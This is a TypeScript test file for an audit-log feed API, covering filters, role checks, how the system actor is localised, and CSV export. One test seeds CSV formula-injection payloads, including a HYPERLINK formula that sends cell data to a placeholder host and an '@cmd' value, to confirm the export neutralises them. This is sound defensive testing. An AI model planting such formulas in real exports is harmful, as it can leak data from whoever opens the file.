// tests/audit.test.ts — the Audit feed route (Session 6). Pagination + category
// chip filter + time-range window + actor/target search, joined to users for the
// actor name/initials (null actor → `actor: null`; the WORD is the browser's job). Test rows are isolated via a unique
// action marker passed as the search query.
import { test, expect, beforeAll, afterAll } from 'bun:test';
import { eq, inArray, like } from 'drizzle-orm';
import { __setAuthOverridesForTests } from '../src/middleware/auth';
import { UnauthorizedError } from '../src/types';
import { Router } from '../src/utils/router';
import { registerAuditRoutes } from '../src/routes/audit';
import { db, users, auditLog, auditExports } from '../src/db/client';
import type { User } from '../src/types';

const EXPORT_DATE = '2099-02-20';

const ADMIN_ID = '00000000-0000-0000-0000-0000006c0100';
const platform: User = { id: ADMIN_ID, email: 'aud@test', name: 'Aud Admin', roles: ['super_admin', 'employee'] };
const employee: User = { id: ADMIN_ID, email: 'aud@test', name: 'Aud Admin', roles: ['employee'] };
const MARK = 'ztest.audit';
// Not a prefix/substring of MARK, so the MARK row counts above are untouched.
const FORMULA_MARK = 'zformula.csv';

function install(u: User) {
  __setAuthOverridesForTests({
    validateAuth: async () => u,
    requireRole: async (_req, role) => {
      if (!u.roles.includes(role)) throw new UnauthorizedError(`Role '${role}' required`);
      return u;
    },
  });
}

const router = new Router();
registerAuditRoutes(router);

async function callJson(method: string, path: string) {
  const matched = router.match(method, path.split('?')[0]!);
  if (!matched) throw new Error(`no route for ${method} ${path}`);
  const req = new Request(`http://localhost${path}`, { method });
  const res = await matched.handler(req, ...matched.params);
  const text = await res.text();
  return { status: res.status, json: text ? JSON.parse(text) : null };
}

async function callBody(method: string, path: string, body: unknown) {
  const matched = router.match(method, path.split('?')[0]!);
  if (!matched) throw new Error(`no route for ${method} ${path}`);
  const req = new Request(`http://localhost${path}`, {
    method,
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify(body),
  });
  const res = await matched.handler(req, ...matched.params);
  const text = await res.text();
  return { status: res.status, json: text ? JSON.parse(text) : null };
}

async function callText(method: string, path: string) {
  const matched = router.match(method, path.split('?')[0]!);
  if (!matched) throw new Error(`no route for ${method} ${path}`);
  const req = new Request(`http://localhost${path}`, { method });
  const res = await matched.handler(req, ...matched.params);
  return { status: res.status, contentType: res.headers.get('content-type'), text: await res.text() };
}

async function cleanup() {
  await db.delete(auditLog).where(like(auditLog.action, `${MARK}%`));
  await db.delete(auditLog).where(like(auditLog.action, `${FORMULA_MARK}%`));
  await db.delete(auditLog).where(eq(auditLog.action, 'audit.export'));
  await db.delete(auditExports).where(eq(auditExports.export_date, EXPORT_DATE));
  await db.delete(users).where(inArray(users.id, [ADMIN_ID]));
}

// explicit hook timeout — see the long note in license-provisioning.test.ts; bun ignores
// bunfig's [test] timeout for hooks, so a slow one fails as "(unnamed) [5003ms]" with no file/cause.
beforeAll(async () => {
  await cleanup();
  await db.insert(users).values({ id: ADMIN_ID, email: platform.email, name: platform.name, avatar_initials: 'AA' }).onConflictDoNothing();
  // 3 sandbox rows (one System), 2 policy rows.
  await db.insert(auditLog).values([
    { actor_id: ADMIN_ID, action: `${MARK}.run`, category: 'sandbox', target_type: 'flow', target_id: 'zflow-1', result: 'Success', result_tone: 'ok' },
    { actor_id: ADMIN_ID, action: `${MARK}.run`, category: 'sandbox', target_type: 'flow', target_id: 'zflow-2', result: 'Success', result_tone: 'ok' },
    { actor_id: null, action: `${MARK}.refresh`, category: 'sandbox', target_type: 'dataset', target_id: 'znight', result: 'OK', result_tone: 'ok' },
    { actor_id: ADMIN_ID, action: `${MARK}.change`, category: 'policy', target_type: 'policy', target_id: 'zpolicy', result: 'Applied', result_tone: 'warn' },
    { actor_id: ADMIN_ID, action: `${MARK}.change2`, category: 'policy', target_type: 'policy', target_id: 'zpolicy2', result: 'Applied', result_tone: 'warn' },
  ]);
  install(platform);
}, 30_000);
afterAll(async () => {
  await cleanup();
  __setAuthOverridesForTests(undefined);
}, 30_000);

test('non-super_admin user is rejected (403)', async () => {
  install(employee);
  expect((await callJson('GET', '/api/audit')).status).toBe(403);
  install(platform);
});

// ⛔ THIS TEST USED TO PIN `sys.actor.name === 'System'` — i.e. it pinned the DEFECT. The route
// answered "who did this?" for an unattributed row with an English noun minted server-side, and
// every consumer printed it verbatim: /audit's actor column and, worse, /ontology's otherwise fully
// localized "Recente wijzigingen" panel, where a Dutch reader got
// "System · Aangepaste entiteit aangemaakt · 2u geleden".
//
// The wire now carries the FACT — `actor: null`, "no human wrote this row" — and the browser
// supplies the word (`m.audit_actor_system()`). Same split as every other machine-code/label pair
// in this repo. The assertion is `toBeNull()`, not `toBeFalsy()`: `undefined` would mean the field
// stopped being serialized at all, which is a different (and breaking) change.
test('feed returns `actor: null` for a row no human wrote + per-category counts', async () => {
  const r = await callJson('GET', `/api/audit?q=${MARK}&range=all`);
  expect(r.status).toBe(200);
  expect(r.json.counts.sandbox).toBe(3);
  expect(r.json.counts.policy).toBe(2);
  const sys = r.json.items.find((i: { targetId: string }) => i.targetId === 'znight');
  expect(sys.actor).toBeNull();
  // ⛔ AND THE ENGLISH IS GONE FROM THE ROW ENTIRELY, not merely moved. A fix that shipped
  // `{ name: 'System', system: true }` would satisfy a null-check written as `toBeFalsy` on a
  // nested field and still put the untranslatable word on the wire.
  expect(JSON.stringify(sys)).not.toContain('System');
  // ⛔ NON-VACUITY: a route that dropped `actor` for EVERYONE would pass the two lines above.
  const mine = r.json.items.find((i: { targetId: string }) => i.targetId === 'zflow-1');
  expect(mine.actor.name).toBe('Aud Admin');
  expect(mine.actor.initials).toBe('AA');
});

test('category filter narrows to one chip', async () => {
  const r = await callJson('GET', `/api/audit?q=${MARK}&range=all&category=policy`);
  expect(r.json.total).toBe(2);
  expect(r.json.items.every((i: { category: string }) => i.category === 'policy')).toBe(true);
});

test('search matches target id', async () => {
  const r = await callJson('GET', `/api/audit?q=zflow-1&range=all`);
  expect(r.json.items.length).toBe(1);
  expect(r.json.items[0].targetId).toBe('zflow-1');
});

test('range=custom with a window spanning today includes the rows', async () => {
  const r = await callJson('GET', `/api/audit?q=${MARK}&range=custom&from=2000-01-01&to=2999-12-31`);
  expect(r.status).toBe(200);
  expect(r.json.counts.sandbox).toBe(3);
  expect(r.json.counts.policy).toBe(2);
});

test('range=custom with a past-only window excludes today rows', async () => {
  const r = await callJson('GET', `/api/audit?q=${MARK}&range=custom&from=2000-01-01&to=2000-01-02`);
  expect(r.status).toBe(200);
  expect(r.json.total).toBe(0);
  expect(r.json.items.length).toBe(0);
});

test('GET /api/audit/export.csv is platform-gated', async () => {
  install(employee);
  expect((await callText('GET', '/api/audit/export.csv')).status).toBe(403);
  install(platform);
});

test('GET /api/audit/export.csv returns the filtered feed as CSV (header + one row per match)', async () => {
  const r = await callText('GET', `/api/audit/export.csv?q=${MARK}&range=all`);
  expect(r.status).toBe(200);
  expect(r.contentType).toContain('text/csv');
  const lines = r.text.trim().split('\n');
  // header + 5 MARK rows (3 sandbox + 2 policy)
  expect(lines[0]).toBe('time,actor,category,event,target_type,target_id,result');
  expect(lines.length).toBe(6);
  expect(r.text).toContain('zflow-1');
  // ⛔ THE CSV KEEPS THE ENGLISH LITERAL, DELIBERATELY — and this line is the pin on that
  // decision, not an oversight left behind by the JSON change above. This file has no reader, so
  // there is no locale to render in; every other cell it emits is already a fixed-language machine
  // token (the header row, the category enum, the action enum, target_type) and `result` is the
  // backend's own English prose. Translating exactly one cell would make the file's language depend
  // on who clicked Download — two exports of the same rows would stop diffing, and a compliance
  // grep for the system actor would need eight spellings. See routes/audit.ts's note above the
  // header array.
  expect(r.text).toContain('System');
});

test('GET /api/audit/export.csv neutralises a member-typed formula in target_id / result (leading \')', async () => {
  // A request name a member typed is the audit row's target_id (routes/information-requests.ts).
  await db.insert(auditLog).values([
    { actor_id: ADMIN_ID, action: `${FORMULA_MARK}.a`, category: 'data', target_type: 'information_request', target_id: '=HYPERLINK("https://x.invalid/?"&A1,"open")', result: '+SUM(1,2)', result_tone: 'ok' },
    { actor_id: ADMIN_ID, action: `${FORMULA_MARK}.b`, category: 'data', target_type: 'information_request', target_id: '@cmd', result: '-2+3', result_tone: 'ok' },
  ]);
  const r = await callText('GET', `/api/audit/export.csv?q=${FORMULA_MARK}&range=all`);
  expect(r.status).toBe(200);
  const body = r.text.split('\n').slice(1).join('\n');
  expect(body).toContain(`"'=HYPERLINK(""https://x.invalid/?""&A1,""open"")"`);
  expect(body).toContain(`,"'+SUM(1,2)"`);
  expect(body).toContain(",'@cmd,'-2+3");
  // No cell of these rows starts a formula once the CSV quoting is undone.
  for (const line of body.trim().split('\n')) {
    for (const cell of line.split(/,(?=(?:[^"]*"[^"]*")*[^"]*$)/)) {
      expect(cell.replace(/^"/, '')).not.toMatch(/^[=+\-@\t\r]/);
    }
  }
});

test('GET /api/audit/export.csv honours the category filter', async () => {
  const r = await callText('GET', `/api/audit/export.csv?q=${MARK}&range=all&category=policy`);
  expect(r.status).toBe(200);
  const lines = r.text.trim().split('\n');
  expect(lines.length).toBe(3); // header + 2 policy rows
  expect(r.text).not.toContain('zflow-1');
});

test('POST /api/audit/export is platform-gated', async () => {
  install(employee);
  expect((await callBody('POST', '/api/audit/export', { date: EXPORT_DATE })).status).toBe(403);
  install(platform);
});

test('POST /api/audit/export reaches runExport for the given date (storage unconfigured → error, never crashes)', async () => {
  // No AUDIT_EXPORT_STORAGE_URL in tests → the export records an error rather than throwing.
  const r = await callBody('POST', '/api/audit/export', { date: EXPORT_DATE, force: true });
  expect(r.status).toBe(200);
  expect(r.json.date).toBe(EXPORT_DATE);
  expect(r.json.status).toBe('error');
  const [row] = await db.select().from(auditExports).where(eq(auditExports.export_date, EXPORT_DATE));
  expect(row!.status).toBe('error');
  expect(row!.triggered_by).toBe('manual');
});
